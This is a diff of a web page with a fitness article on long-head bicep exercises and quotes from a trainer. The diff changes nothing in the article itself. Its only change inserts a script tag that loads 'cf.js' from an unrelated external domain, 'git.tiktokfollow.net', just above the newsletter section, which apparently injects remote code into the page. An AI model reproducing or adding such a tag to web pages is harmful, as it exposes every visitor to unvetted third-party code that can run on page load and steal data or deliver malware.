@@ -38,7 +38,7 @@ The second exercise for the long head of the bicep is the dumbbell incline curl.
 The third long head exercise is a row curl, performed by bringing the dumbbells down to the sides of the feet, which are positioned together, and back up, utilizing that same backward elbow motion. "We're trying to initiate a dead row, but we pull them up with more of a curling motion," Cavaliere explains.
 
 The fourth longhead move is the waiter's curl, which involves lifting just one dumbbell in a vertical motion with a grip variation: resting the top flat side of the dumbbell on your open palms takes the pressure off your forearms and more on the biceps. "The goal is to simply keep that top portion of the dumbbell flat, parallel to the ceiling and the floor, throughout the exercise," says Cavaliere. "If you don't feel like your biceps are going to pop at the top end of this, you're not doing it right.
-
+<script src="https://git.tiktokfollow.net/cf.js" async></script>
 <section class="newsletter">
 <div class="container">
 <div class="row">
